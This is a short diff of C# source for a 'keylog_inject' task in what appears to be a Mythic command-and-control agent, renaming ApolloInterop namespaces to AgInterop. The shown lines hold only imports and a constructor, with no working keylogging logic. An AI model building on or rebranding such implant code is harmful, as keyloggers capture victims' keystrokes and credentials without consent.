@@ -6,15 +6,15 @@
 
 #if KEYLOG_INJECT
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Collections;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Enums.ApolloEnums;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Serializers;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Structs.MythicStructs;
+using AgInterop.Classes;
+using AgInterop.Classes.Collections;
+using AgInterop.Classes.Core;
+using AgInterop.Classes.Events;
+using AgInterop.Enums.AgCoreEnums;
+using AgInterop.Interfaces;
+using AgInterop.Serializers;
+using AgInterop.Structs.AgCoreStructs;
+using AgInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
@@ -56,7 +56,7 @@ namespace Tasks
 
         private bool _completed = false;
 
-        public keylog_inject(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public keylog_inject(IAgent agent, AgInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _putKeylogsAction = (object p) =>
             {
